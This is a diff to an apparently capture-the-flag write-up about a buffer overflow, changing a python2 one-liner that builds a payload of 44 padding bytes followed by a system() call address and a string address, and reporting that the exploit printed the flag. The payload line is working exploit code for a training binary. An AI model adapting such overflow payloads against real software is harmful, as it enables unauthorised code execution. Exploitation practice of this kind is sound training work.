@@ -41,7 +41,7 @@ So the payload will be of the form:
 (44 bytes of junk) + (address of call to system()) + (address of usefulString)
 ```
 ```bash
-python2 -c 'print "\x00"*44 + "\x1a\x86\x04\x08" + "\x30\xa0\x04\x08"' > payload.txt
+python2 -c 'print "\x00"*44 + "\x1a\x86\x04\x08" + "junk" + "\x30\xa0\x04\x08"' > payload.txt
 ```
 ![[Pasted image 20231215180605.png]]
 As shown in the above picture, using this payload, the exploit was successful and the flag was printed.
